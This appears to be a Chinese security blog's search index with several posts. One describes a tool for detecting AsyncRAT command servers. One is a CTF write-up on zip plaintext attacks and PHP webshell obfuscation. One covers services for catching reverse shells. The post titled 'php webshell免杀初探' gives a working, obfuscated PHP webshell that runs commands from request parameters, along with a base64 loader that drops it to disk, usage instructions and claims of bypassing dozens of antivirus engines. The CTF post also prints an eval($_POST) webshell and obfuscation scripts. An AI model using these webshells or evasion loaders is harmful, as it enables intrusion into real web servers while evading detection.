<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AsyncRAT C2发现</title>
      <link href="/2024/03/27/AsyncRAT%20C2%E5%8F%91%E7%8E%B0/"/>
      <url>/2024/03/27/AsyncRAT%20C2%E5%8F%91%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Github项目地址： <a href="https://github.com/g1an123/AsyncRAT_C2_Search">https://github.com/g1an123/AsyncRAT_C2_Search</a></p></blockquote><h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>上学期参与RAT对抗课题研究。第一次接触APT狩猎，完全不知道从何下手，感谢老师、学长们的帮助。</p><p>在对于AsyncRAT 外层TLS(ECDHE)流量的解密上，尝试了中间人攻击等方法，但还是因为比赛、学业上的事情搁置了很久。</p><p>直到大年初二，躺在床上刷先知社区偶然发现T0daySeeker师傅的文章，师傅说用win7就可以解决流量解密的问题🤯（当然涉及到加密套件的问题，建议看看原文），【也提醒了我还有个项目没做完（doge）】。</p><p>后来熬了两个晚上终于把脚本搞定了（为什么是晚上呢，因为白天要出去玩🐶）。<br>按照正常的故事情节，第三天本来是要跟老师对进度，但是呢，好巧不巧，电脑💻屏幕被砸碎了😭（让我本就不多的压岁钱🧧更薄了）。于是磨磨蹭蹭就开学了。</p><p>开学后就开始着手做公网探测了，还做了一些和fofa收录的对比。发现主流搜索引擎识别AsyncRAT C2仅有TLS证书一个特征，明显收录范围很窄。</p><p>OK故事到这里，应该是优化脚本后，开个服务器库库开扫。但是并没有，一个是发现优化后效果仍不理想（如果有师傅有什么比较好的优化点子💡欢迎随时踢我）。没错，后来就是考试和学业让我的进度一拖再拖。</p><p>看到微步已经完成相关的拓线研究🧐，于是便萌生开源主机发现脚本的想法。</p><p>脚本也处于能用就行的状态，望各位师傅见谅。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>AT&amp;T Alien Labs 最近披露了一场历时 11 个月 AsyncRAT 攻击活动。攻击者采用钓鱼页面传递初始 JavaScript 文件，涉及 300 多个样本和 100 多个域名。这次攻击选择目标经过仔细挑选，其中包括美国关键基础设施管理者。为了规避检测，加载器使用了大量混淆和反沙箱技术，同时 DGA 域每周更新一次。值得注意的是，攻击仍在持续进行中，不断有新的域和 AsyncRAT 样本注册。</p><p>AsyncRAT 是 2019 年发布的开源远程访问工具，可被用作远程访问特洛伊（RAT）。攻击过程包括通过恶意钓鱼网页传递 JavaScript 文件，利用多层混淆和反分析技术。攻击者还灵活使用反沙箱技术，通过计算受害者虚拟机概率，巧妙规遍各个受害者，成功逃避检测。最终，脚本执行下载 AsyncRAT 客户端。</p><p>总体而言，这场攻击呈现出精心策划、持续时间长、具有高度混淆和反分析技术的异步远程访问工具活动。攻击者通过选择特定目标、采用反沙箱技术和使用动态域名生成器，成功地更新网络基础设施，从而有效地逃避了检测。</p><p>copy from 微步 哈哈哈哈</p><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><h3 id="TLS证书"><a href="#TLS证书" class="headerlink" title="TLS证书"></a>TLS证书</h3><blockquote><p>优：命中率100%，也是各大搜索引擎最常用的。<br>缺：收录范围窄，有经验的apt组织在使用前都会修改证书名。</p></blockquote><p><strong>关于TLS证书的选择：</strong><br>建立连接使用的证书和密钥均从win7主机生成的p12证书提取。win7主机下通信加密套件默认选择生成的<code>TLS_RSA_WITH_AES_128_CBC_SHA</code> 而非具有前向安全的<code>TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA</code>（加密套件的优先级可以调整）,  且其生成的p12证书没有密码保护，直接提取私钥，规避证书格式引起的问题。</p><p>以fofa为例，进行了以下验证。（实验日期3月2日）</p><h4 id="1-收录语法测试"><a href="#1-收录语法测试" class="headerlink" title="1. 收录语法测试"></a>1. 收录语法测试</h4><ol><li>fofa规则<code>app=&quot;AsyncRAT&quot;</code>数据量与<code>cert.issuer=&quot;AsyncRAT&quot;</code>一致，共1,682条，811条ip。</li><li>反向搜索一致<code>app=&quot;AsyncRAT&quot; &amp;&amp; cert.issuer!=&quot;AsyncRAT&quot;</code>数据量0条</li></ol><h4 id="2-服务器收录方案验证"><a href="#2-服务器收录方案验证" class="headerlink" title="2. 服务器收录方案验证"></a>2. 服务器收录方案验证</h4><blockquote><p>用自己的服务器配置了以下AsyncRAT服务进行验证。<br>验证结果：fofa仅通过是否AsyncRAT字样进行确定，没有脚本表现好。</p></blockquote><p>IP：111.92.241.26</p><ul><li>4404部署0.5.3版本正常证书名</li><li>5505部署0.5.3 Hacker Server</li><li>8808部署0.5.8版本正常证书名</li><li>9909 部署0.5.8HackerC2 Server</li></ul><p><strong>验证语句</strong>：</p><blockquote><p>app&#x3D;”AsyncRAT” &amp;&amp; ip&#x3D;”111.92.241.26”</p></blockquote><p><strong>fofa验证结果</strong>：8808收录，而9909通过修改证书名，躲过了fofa的特征搜索。<br>4404收录，而5505通过修改证书名，躲过了fofa的特征搜索。<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202403271225249.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202403271225017.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202403271225015.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202403271226695.png"><br><strong>服务器部署截图</strong>：<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202403271226962.png"><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202403271227888.png"></p><h3 id="Ping包"><a href="#Ping包" class="headerlink" title="Ping包"></a>Ping包</h3><blockquote><p>优：稳定且准确率高</p></blockquote><p>通过流量分析提取出AsyncRAT的ping包 重放进行特征识别，由于高版本对流量进行了gzip加密，所以高低版本需要分别发包验证。</p><p>client发送信息代码部分<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202403271227449.png"><br> Server服务端收到结果返回信息代码部分<br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202403271228960.png"></p><h3 id="JARM指纹"><a href="#JARM指纹" class="headerlink" title="JARM指纹"></a>JARM指纹</h3><blockquote><p>优：用来做辅助验证挺不错的</p></blockquote><p>用JA3S 也可以，需要注意的是高低版本指纹也不一致。</p><h3 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h3><p><strong>结果对比</strong>：fofa:1682条, 脚本:220条。</p><pre><code>猜测1482条数据的AsyncRAT 服务已经下线。</code></pre><p>判断依据：</p><ol><li>fofa更新时间距今较久，最近更新的数据皆可通过验证。</li><li>使用sslscan，nmap，openssl均为time out ，猜测服务已经下线</li><li>本地生成木马链接服务端，无法链接成功。</li></ol><p>（截图懒得放了，有点多）</p><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><p>探测识别AsyncRAT C2 工具服务端，方便安全研究人员进行apt组织追踪，情报拓线。覆盖目前官方仓库所有版本。（我也不知道咋吹了）</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><ol><li>检测单个端口：</li></ol><pre><code class="python">python3 AsyncRAT_C2_Seearch.py  host  port</code></pre><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202403262215797.png"></p><ol start="2"><li>公网检测、ip、ip段检测，查看<code>C2公网探测.py</code></li></ol><pre><code class="text"># scan_ip_range(&quot;186.137.33.1&quot;, &quot;C&quot;) # 扫描ip段，可指定C B段  # ip_scan(&quot;218.204.179.10&quot;)          # 扫描单个ip  # ip_scan(&quot;161.97.151.222&quot;,7788)     # 扫描单个端口  # process_target_csv(&quot;target1.csv&quot;)    # 扫描文件  # scan_ip_range_from_file(&quot;ip_range.txt&quot;) # 从文件中获取ip段扫描</code></pre><p>运行环境：Macos 12.5<br>其他环境暂未测试</p><h2 id="项目地址："><a href="#项目地址：" class="headerlink" title="项目地址："></a>项目地址：</h2><p>Github： <a href="https://github.com/g1an123/AsyncRAT_C2_Search">https://github.com/g1an123/AsyncRAT_C2_Search</a></p><h2 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h2><p>感谢老师的耐心指导，学长们的帮助，尤其浩然哥在中间人攻击解密等问题上给予了莫大的帮助😁。</p><p>石总@smc帮忙优化了公网探测脚本，优化后的版本尚未放出，敬请期待😋。</p>]]></content>
      
      
      <categories>
          
          <category> 安全研究🧐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APT狩猎 </tag>
            
            <tag> AsyncRAT </tag>
            
            <tag> C2发现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php webshell免杀初探</title>
      <link href="/2024/02/06/php%20webshell%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2/"/>
      <url>/2024/02/06/php%20webshell%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前段时间上班无聊，刷公众号偶然发现一篇“<a href=https://github.com/icewolf-sec/PerlinPuzzle-Webshell-PHP>原神免杀</a>”的文章，突然来了兴趣研究研究，找了曾哥的<a href=https://blog.zgsec.cn/archives/197.html>webshell免杀手册</a>来看。自己做了几个样本，效果测试还不错，就放出来和大家交流，感觉基本够用。</p></blockquote><p>截止2月6日</p><h3 id="免杀效果："><a href="#免杀效果：" class="headerlink" title="免杀效果："></a>免杀效果：</h3><p><strong>免杀成功</strong>：绕过成功：阿里伏魔引擎、安恒云沙箱、河马WebShell查杀、魔盾云沙箱、微步集成引擎共26个（微软、卡巴斯基、IKARUS、Avast、GDATA、安天、360、NANO、瑞星、Sophos、WebShell专杀、MicroAPT、OneStatic、ESET、小红伞、大蜘蛛、AVG、K7、江民、Baidu、TrustBook、熊猫、ClamAV、Baidu-China、OneAV、MicroNonPE）、D盾、Windows Defender、火绒安全软件</p><p><strong>免杀失败</strong>：长亭百川WebShell查杀引擎<br><strong>解决方案</strong>：通过webshell加载器进行绕过，实战中不知道是否可行。（可能要加入不死马机制？）</p><p>本体.php</p><pre><code class="php">  &lt;?php  function GMigF()&#123;      return chr(1078/11)/* qChxU h JsC*/.chr(970/10).chr(1725/15).chr(1616/16).chr(270/5).chr(520/10).chr(665/7).chr(1100/11).chr(1414/14).chr(1485/15).chr(1554/14).chr(600/6).chr(1515/15);  &#125;  $tkhSr = GMigF();    function test()&#123;      return extract($_GET);  &#125;      class Gw0O6U55 &#123;      public $dKd;      public function __construct($H5Hm8)&#123;          $this-&gt;dKd=&quot;/*Z871A24vf4*/&quot;.$H5Hm8.&quot;/*Z871A24vf4*/&quot;;      &#125;  &#125;    if (test())&#123;      $auPtVEeJgC=new Gw0O6U55($_REQUEST[$tkhSr(&#39;MQ==&#39;)]);      $LPMeYBR=substr($auPtVEeJgC -&gt;dKd,14,-14);  &#125;      $VEIlAcb =[      0 =&gt; [$tkhSr(&#39;cGlwZQ==&#39;), $tkhSr(&#39;cg==&#39;)],      1 =&gt; [$tkhSr(&#39;cGlwZQ==&#39;), $tkhSr(&#39;dw==&#39;)],      2 =&gt; [$tkhSr(&#39;cGlwZQ==&#39;), $tkhSr(&#39;dw==&#39;)],  ];    $qwVrFISA = proc_open($LPMeYBR, $VEIlAcb,$pipes);    if (is_resource($qwVrFISA))&#123;      $shqeo = stream_get_contents($pipes[1]);        fclose($pipes[0]);      fclose($pipes[1]);      fclose($pipes[2]);      proc_close($qwVrFISA);        echo $shqeo;  &#125;</code></pre><p>加载器</p><pre><code class="php">&lt;?php  $hahaha = strtr(&quot;abatme&quot;,&quot;me&quot;,&quot;em&quot;);  $wahaha = strtr($hahaha,&quot;ab&quot;,&quot;sy&quot;);  $gogogo = strtr(&#39;echo &quot;Cjw/cGhwCmZ1bmN0aW9uIEdNaWdGKCl7CiAgICByZXR1cm4gY2hyKDEwNzgvMTEpLyogcUNoeFUgaCBKc0MqLy5jaHIoOTcwLzEwKS5jaHIoMTcyNS8xNSkuY2hyKDE2MTYvMTYpLmNocigyNzAvNSkuY2hyKDUyMC8xMCkuY2hyKDY2NS83KS5jaHIoMTEwMC8xMSkuY2hyKDE0MTQvMTQpLmNocigxNDg1LzE1KS5jaHIoMTU1NC8xNCkuY2hyKDYwMC82KS5jaHIoMTUxNS8xNSk7Cn0KJHRraFNyID0gR01pZ0YoKTsKCmZ1bmN0aW9uIHRlc3QoKXsKICAgIHJldHVybiBleHRyYWN0KCRfR0VUKTsKfQoKCmNsYXNzIEd3ME82VTU1IHsKICAgIHB1YmxpYyAkZEtkOwogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRINUhtOCl7CiAgICAgICAgJHRoaXMtPmRLZD0iLypaODcxQTI0dmY0Ki8iLiRINUhtOC4iLypaODcxQTI0dmY0Ki8iOwogICAgfQp9CgppZiAodGVzdCgpKXsKICAgICRhdVB0VkVlSmdDPW5ldyBHdzBPNlU1NSgkX1JFUVVFU1RbJHRraFNyKCdNUT09JyldKTsKICAgICRMUE1lWUJSPXN1YnN0cigkYXVQdFZFZUpnQyAtPmRLZCwxNCwtMTQpOwp9CgoKJFZFSWxBY2IgPVsKICAgIDAgPT4gWyR0a2hTcignY0dsd1pRPT0nKSwgJHRraFNyKCdjZz09JyldLAogICAgMSA9PiBbJHRraFNyKCdjR2x3WlE9PScpLCAkdGtoU3IoJ2R3PT0nKV0sCiAgICAyID0+IFskdGtoU3IoJ2NHbHdaUT09JyksICR0a2hTcignZHc9PScpXSwKXTsKCiRxd1ZyRklTQSA9IHByb2Nfb3BlbigkTFBNZVlCUiwgJFZFSWxBY2IsJHBpcGVzKTsKCmlmIChpc19yZXNvdXJjZSgkcXdWckZJU0EpKXsKICAgICRzaHFlbyA9IHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTsKCiAgICBmY2xvc2UoJHBpcGVzWzBdKTsKICAgIGZjbG9zZSgkcGlwZXNbMV0pOwogICAgZmNsb3NlKCRwaXBlc1syXSk7CiAgICBwcm9jX2Nsb3NlKCRxd1ZyRklTQSk7CgogICAgZWNobyAkc2hxZW87Cn0K&quot; |base64 -d &gt; ./out2.php&#39;,&quot;&quot;,&quot;&quot;);  $wahaha($gogogo);</code></pre><h3 id="如何使用："><a href="#如何使用：" class="headerlink" title="如何使用："></a>如何使用：</h3><ol><li><p>直接上传本体：<br><code>?c=1&amp;1=&#123;cmd&#125;</code><br>如：<br><code>?c=1&amp;1=ls</code></p></li><li><p>使用加载器:<br>访问加载器后webshell地址在同级目录下的<code>out2.php</code><br>传参和上文一致。</p></li></ol><p>免杀绕过截图放在下面：</p><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233651.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233652.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233653.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233655.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233656.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233657.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233658.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233659.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233660.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233661.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233662.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233663.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233664.png"><br><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202402062233665.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 入门 </tag>
            
            <tag> webshell免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023春秋杯冬季赛--明文混淆</title>
      <link href="/2024/01/30/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B--%E6%98%8E%E6%96%87%E6%B7%B7%E6%B7%86/"/>
      <url>/2024/01/30/2023%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B--%E6%98%8E%E6%96%87%E6%B7%B7%E6%B7%86/</url>
      
        <content type="html"><![CDATA[<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="方法一（成功率较低）："><a href="#方法一（成功率较低）：" class="headerlink" title="方法一（成功率较低）："></a>方法一（成功率较低）：</h2><p>明文攻击解压缩包，license找到文件大小最相近的进行明文攻击。 对比大小后最可能的是gpl-3.0协议。 <a href="https://choosealicense.com/licenses/gpl-3.0/#">https://choosealicense.com/licenses/gpl-3.0/#</a> bkcrack明文攻击压缩包得到混淆webshell。 <img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312041706908.png"> <img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312041706628.png"></p><h2 id="方法二（部分明文攻击，成功率较高）："><a href="#方法二（部分明文攻击，成功率较高）：" class="headerlink" title="方法二（部分明文攻击，成功率较高）："></a>方法二（部分明文攻击，成功率较高）：</h2><p>删掉大部分明文，只留下标题附近那一段进行部分明文攻击。<br>图忘截了。🤦‍♂️</p><h1 id="两层混淆解密"><a href="#两层混淆解密" class="headerlink" title="两层混淆解密"></a>两层混淆解密</h1><p>参考文章:<a href="https://blog.zgsec.cn/archives/147.html">https://blog.zgsec.cn/archives/147.html</a></p><h2 id="o00o0o嵌套加密"><a href="#o00o0o嵌套加密" class="headerlink" title="o00o0o嵌套加密"></a>o00o0o嵌套加密</h2><p>打印eval执行函数得到是base64_decode函数 解密base64 <img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312041707448.png"> 使用echo输出</p><pre><code class="php">&lt;?php    $O00OO0=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);    $O00O0O=$O00OO0&#123;3&#125;.$O00OO0&#123;6&#125;.$O00OO0&#123;33&#125;.$O00OO0&#123;30&#125;;$O0OO00=$O00OO0&#123;33&#125;.$O00OO0&#123;10&#125;.$O00OO0&#123;24&#125;.$O00OO0&#123;10&#125;.$O00OO0&#123;24&#125;;$OO0O00=$O0OO00&#123;0&#125;.$O00OO0&#123;18&#125;.$O00OO0&#123;3&#125;.$O0OO00&#123;0&#125;.$O0OO00&#123;1&#125;.$O00OO0&#123;24&#125;;$OO0000=$O00OO0&#123;7&#125;.$O00OO0&#123;13&#125;;$O00O0O.=$O00OO0&#123;22&#125;.$O00OO0&#123;36&#125;.$O00OO0&#123;29&#125;.$O00OO0&#123;26&#125;.$O00OO0&#123;30&#125;.$O00OO0&#123;32&#125;.$O00OO0&#123;35&#125;.$O00OO0&#123;26&#125;.$O00OO0&#123;30&#125;;        $O0O000=&quot;NoJpuRUVQdeXLBwFaEvMPhtCIxlAYrHDsOynWScjTKkZgmbqGifzkLexbWjMsNrBOgcRInyZCdaAzEqUfvJDGTtuwQFKhiVmSXPoYlpHCD9cIJUimBmdPAdurXqbmXEdNYjLfXRHmhf0B2Wqf29VmQSuMhguNRZ4rqeKWVkiWA9gjnWyPRNjTJWiMnG4Nj5HN3s4WnNCFuxeF2qzmVqhkYa2huxmruxMIKR5MVmMMVa4MXL5MHg0FXknsjn9CQFxiQV7zUL/CS==&quot;;    echo htmlspecialchars(&#39;?&gt;&#39;.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));    ?&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312041707047.png"></p><p>得到第二层加密密文</p><pre><code class="php">?&gt;&lt;?php eval(gzinflate(base64_decode(&#39;U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==&#39;))); ?&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312041707601.png"></p><h2 id="简单的Gzip-Base64加密"><a href="#简单的Gzip-Base64加密" class="headerlink" title="简单的Gzip+Base64加密"></a>简单的Gzip+Base64加密</h2><p>直接使用曾哥写好的解密脚本梭哈。 解密脚本：</p><pre><code class="php">&lt;?php    //放入已经加密的PHP内容    $a = &quot;eval(gzinflate(base64_decode(&#39;U0gtS8zRcFCJD/APDolWT8tJTK8uNswt8DGOrzIsiHfIS4kvNzYzzUj1yVFUVKxVj9W0trcDAA==&#39;)));&quot;;    function decodephp($a)    &#123;        $max_level = 300; //最大层数        for ($i = 0; $i &lt; $max_level; $i++) &#123;            ob_start();            eval(str_replace(&#39;eval&#39;, &#39;echo&#39;, $a));            $a = ob_get_clean();            if (strpos($a, &#39;eval(gzinflate(base64_decode&#39;) === false) &#123;                return $a;            &#125;        &#125;&#125;    //这里注意要加htmlspecialchars，我看好多文章没写    echo htmlspecialchars(decodephp($a));    ?&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312041707127.png"> 得到flag <code>flag&#123;s1mpL3_z1p_@nd_w365heLl!!!&#125;</code></p><h1 id="出题思路："><a href="#出题思路：" class="headerlink" title="出题思路："></a>出题思路：</h1><h1 id="webshell加密"><a href="#webshell加密" class="headerlink" title="webshell加密"></a>webshell加密</h1><p>第一层：简单的Gzip+Base64加密<br>我们先新建一个PHP文件，名字为 <code>phpinfo.php</code></p><pre><code class="php">&lt;?php  eval(@$_POST[&#39;flag&#123;s1mpL3_z1p_@nd_w365heLl!!!&#125;&#39;]); ?&gt;</code></pre><p>然后我们再新建一个PHP文件，名字为 <code>encipher.php</code> ，放入以下代码并保存：</p><pre><code class="php">&lt;?phpfunction encode_file_contents($filename) &#123;    $type=strtolower(substr(strrchr($filename,&#39;.&#39;),1));    if(&#39;php&#39;==$type &amp;&amp; is_file($filename) &amp;&amp; is_writable($filename)) &#123;        // 如果是PHP文件 并且可写 则进行压缩编码        $contents = file_get_contents($filename);        // 判断文件是否已经被编码处理        $pos = strpos($contents,&#39;/*Protected by AabyssZG*/&#39;);        if(false === $pos || $pos&gt;100) &#123;            // 去除PHP文件注释和空白，减少文件大小            $contents = php_strip_whitespace($filename);            // 去除PHP头部和尾部标识            $headerPos = strpos($contents,&#39;&lt;?php&#39;);            $footerPos = strrpos($contents,&#39;?&gt;&#39;);            $contents = substr($contents,$headerPos+5,$footerPos-$headerPos);            $encode = base64_encode(gzdeflate($contents));            // 开始编码            $encode = &#39;&lt;?php&#39;.&quot; /*Protected by AabyssZG*/\neval(gzinflate(base64_decode(&#39;&quot;.$encode.&quot;&#39;))); \n?&gt;&quot;;            return file_put_contents($filename,$encode);        &#125;    &#125;    return false;&#125;//调用函数$filename=&#39;phpinfo.php&#39;;//这里填入需要加密的原始PHP文件名encode_file_contents($filename);?&gt;</code></pre><p>第二层： o00o0o嵌套加密</p><pre><code class="php">&lt;?phpfunction RandAbc($length=&quot;&quot;)&#123;//返回随机字符串$str=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;;return str_shuffle($str);&#125;$filename=&#39;phpinfo.php&#39;;  //这里填入需要加密的原始PHP文件名$T_k1=RandAbc();//随机密匙1$T_k2=RandAbc();//随机密匙2$vstr=file_get_contents($filename);//要加密的文件$v1=base64_encode($vstr);$c=strtr($v1,$T_k1,$T_k2);//根据密匙替换对应字符。$c=$T_k1.$T_k2.$c;$q1=&quot;O00O0O&quot;;$q2=&quot;O0O000&quot;;$q3=&quot;O0OO00&quot;;$q4=&quot;OO0O00&quot;;$q5=&quot;OO0000&quot;;$q6=&quot;O00OO0&quot;;$s=&#39;$&#39;.$q6.&#39;=urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);$&#39;.$q1.&#39;=$&#39;.$q6.&#39;&#123;3&#125;.$&#39;.$q6.&#39;&#123;6&#125;.$&#39;.$q6.&#39;&#123;33&#125;.$&#39;.$q6.&#39;&#123;30&#125;;$&#39;.$q3.&#39;=$&#39;.$q6.&#39;&#123;33&#125;.$&#39;.$q6.&#39;&#123;10&#125;.$&#39;.$q6.&#39;&#123;24&#125;.$&#39;.$q6.&#39;&#123;10&#125;.$&#39;.$q6.&#39;&#123;24&#125;;$&#39;.$q4.&#39;=$&#39;.$q3.&#39;&#123;0&#125;.$&#39;.$q6.&#39;&#123;18&#125;.$&#39;.$q6.&#39;&#123;3&#125;.$&#39;.$q3.&#39;&#123;0&#125;.$&#39;.$q3.&#39;&#123;1&#125;.$&#39;.$q6.&#39;&#123;24&#125;;$&#39;.$q5.&#39;=$&#39;.$q6.&#39;&#123;7&#125;.$&#39;.$q6.&#39;&#123;13&#125;;$&#39;.$q1.&#39;.=$&#39;.$q6.&#39;&#123;22&#125;.$&#39;.$q6.&#39;&#123;36&#125;.$&#39;.$q6.&#39;&#123;29&#125;.$&#39;.$q6.&#39;&#123;26&#125;.$&#39;.$q6.&#39;&#123;30&#125;.$&#39;.$q6.&#39;&#123;32&#125;.$&#39;.$q6.&#39;&#123;35&#125;.$&#39;.$q6.&#39;&#123;26&#125;.$&#39;.$q6.&#39;&#123;30&#125;;eval($&#39;.$q1.&#39;(&quot;&#39;.base64_encode(&#39;$&#39;.$q2.&#39;=&quot;&#39;.$c.&#39;&quot;;eval(\&#39;?&gt;\&#39;.$&#39;.$q1.&#39;($&#39;.$q3.&#39;($&#39;.$q4.&#39;($&#39;.$q2.&#39;,$&#39;.$q5.&#39;*2),$&#39;.$q4.&#39;($&#39;.$q2.&#39;,$&#39;.$q5.&#39;,$&#39;.$q5.&#39;),$&#39;.$q4.&#39;($&#39;.$q2.&#39;,0,$&#39;.$q5.&#39;))));&#39;).&#39;&quot;));&#39;;$s=&#39;&lt;?php&#39;.$s.&#39;?&gt;&#39;;echo $s;//生成 加密后的PHP文件$fpp1=fopen(&#39;temp&#39;.$filename,&#39;w&#39;);fwrite($fpp1,$s) or die(&#39;写文件错误&#39;);?&gt;</code></pre><h1 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h1><p>license文件用gpl3.0协议。<br><a href="https://choosealicense.com/licenses/gpl-3.0/#">https://choosealicense.com/licenses/gpl-3.0/#</a><br>,然后与加密后的webshell放在一个文件夹内。<br>使用2345快压进行压缩，压缩方法使用压缩，强密码加密。<br>密码：R05VIEdQTHYz<br>（base64加密后改了一部分doge）</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无公网服务器弹shell解决方案</title>
      <link href="/2024/01/30/%E6%97%A0%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%B9shell%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
      <url>/2024/01/30/%E6%97%A0%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BC%B9shell%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<pre><code>最近vps过期了，打比赛和渗透的时候突然要用就很不方便。</code></pre><h2 id="一：现买"><a href="#一：现买" class="headerlink" title="一：现买"></a>一：现买</h2><p>但是有可能商家会跑路。而且一下子买一个月，后面还不用就很可惜。</p><h2 id="二：Hello-CTF-Shell"><a href="#二：Hello-CTF-Shell" class="headerlink" title="二：Hello_CTF-Shell"></a>二：Hello_CTF-Shell</h2><p><strong>简介</strong>：合法反弹shell一站式最廉价解决方案！！！！（绑腾讯云服务器，加一下snapshot方便一些）<br><a href="https://github.com/ProbiusOfficial/Hello_CTF-Shell?tab=readme-ov-file">https://github.com/ProbiusOfficial/Hello_CTF-Shell?tab=readme-ov-file</a></p><h2 id="三：SakuraFrp"><a href="#三：SakuraFrp" class="headerlink" title="三：SakuraFrp"></a>三：SakuraFrp</h2><p><strong>简介</strong>：用来反弹shell和简单的渗透基本够用。主要是免费（一块钱实名认证费，不能拿来干坏事了🥹）。<br><strong>适合人群</strong>：长期不用，时不时用一下，或者有些工具不方便在服务器上装的。<br><strong>教程</strong>：<br><a href="https://jlan.darkflow.top/posts/23df454a.html">https://jlan.darkflow.top/posts/23df454a.html</a></p><h2 id="其他也许有用："><a href="#其他也许有用：" class="headerlink" title="其他也许有用："></a>其他也许有用：</h2><p>CTF比赛中，一键将本地运行的EXP反弹到VPS端口<br><a href="https://blog.chara.pub/2023/05/02/ctf-publish-port-with-frp/">https://blog.chara.pub/2023/05/02/ctf-publish-port-with-frp/</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>陇剑杯 2021 misc jwt</title>
      <link href="/2023/10/08/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20jwt/"/>
      <url>/2023/10/08/%E9%99%87%E5%89%91%E6%9D%AF%202021%20misc%20jwt/</url>
      
